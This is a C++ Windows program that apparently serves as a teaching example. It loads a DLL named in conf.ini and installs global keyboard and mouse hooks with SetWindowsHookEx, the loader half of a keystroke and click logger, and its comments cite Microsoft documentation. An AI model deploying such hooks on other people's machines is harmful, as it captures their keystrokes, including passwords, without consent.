/*
    SOURCES:
        - https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
        - https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644988(v=vs.85)

    PROJECT SETTINGS:

    INFO:
        - USAGE:
            This program installs a KeyboardProc and a MouseProc hook from a DLL with SetWindowsHookEx.
            When this hook is installed globally with SetWindowsHookEx,
            the hook log all keyboard and mouse clicks to a file.

        - NOTE:
            The DLL that is installed is in another program.

        - X86/64:
            Because hooks run in the context of an application, they must match the "bitness" of the application.
            If a 32-bit application installs a global hook on 64-bit Windows, the 32-bit hook is injected into each 32-bit process (the usual security boundaries apply).
            In a 64-bit process, the threads are still marked as "hooked."
            However, because a 32-bit application must run the hook code, the system executes the hook in the hooking app's context;
            specifically, on the thread that called SetWindowsHookEx.
            This means that the hooking application must continue to pump messages or it might block the normal functioning of the 64-bit processes.
            More info: https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexw#remarks

        - NOTE: for some reason the x64 version detects keyboard and mouse in x86 applications and vice versa
*/
#include <iostream>
#include <windows.h>
#include <stdio.h>

HHOOK hookKeyboard;
HHOOK hookMouse;

// function to read the conf.ini file to determine the path to the DLL
wchar_t* ReadINI(LPCWSTR szSection, LPCWSTR szKey, LPCWSTR szDefaultValue)
{
    wchar_t* szResult = new wchar_t[255];
    memset(szResult, 0x00, 255);
    GetPrivateProfileString(szSection, szKey,
        szDefaultValue, szResult, 255, L".\\conf.ini");
    return szResult;
}

void WINAPI installGlobalHooks()
{
    //lets load the dll and install the global hook
    LPCWSTR dllPath = ReadINI(L"CONFIGURATION", L"DLL_PATH", L"none");
    HMODULE lib = LoadLibrary(dllPath);

    if (lib == NULL) {
        printf("Can't find dll!\n");
        return;
    }

    // GetProcAddress is used with the Name-decoration convention (__stdcall calling convention is used to call Win32 API functions): 
    // An underscore (_) is prefixed to the name and the name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list.
#ifdef _WIN64
    HOOKPROC procedureKeyboard = (HOOKPROC)GetProcAddress(lib, "procedureKeyboard");
    HOOKPROC procedureMouse = (HOOKPROC)GetProcAddress(lib, "procedureMouse");
#else
    HOOKPROC procedureKeyboard = (HOOKPROC)GetProcAddress(lib, "_procedureKeyboard@12");
    HOOKPROC procedureMouse = (HOOKPROC)GetProcAddress(lib, "_procedureMouse@12");
#endif

    if (procedureKeyboard == NULL) {
        printf("Can't find Keyboard function in dll!\n");
        return;
    }

    if (procedureMouse == NULL) {
        printf("Can't find Mouse function in dll!\n");
        return;
    }

    // install hook keyboard
    hookKeyboard = SetWindowsHookEx(WH_KEYBOARD, procedureKeyboard, lib, 0);
    if (hookKeyboard == NULL) {
        printf("Keyboard hook failed to install!\n");
        return;
    }

    // install hook mouse
    hookMouse = SetWindowsHookEx(WH_MOUSE, procedureMouse, lib, 0);
    if (hookMouse == NULL) {
        printf("Mouse hook failed to install!\n");
        return;
    }

    printf("Hooks installed properly!\n\n");
    MSG message;
    // GetMessage retrieves a message from the calling thread's message queue. 
    // The function dispatches incoming sent messages until a posted message is available for retrieval.
    while (GetMessage(&message, NULL, 0, 0))
    {
        // TranslateMessage translates virtual-key messages into character messages. 
        // The character messages are posted to the calling thread's message queue, to be read the next time the thread calls the GetMessage
        TranslateMessage(&message);

        //DispatchMessage dispatches a message to a window procedure.It is typically used to dispatch a message retrieved by the GetMessage function.
        DispatchMessage(&message);
    }

    FreeLibrary(lib);
    UnhookWindowsHookEx(hookKeyboard);
    UnhookWindowsHookEx(hookMouse);
}

int main() {
    installGlobalHooks();
}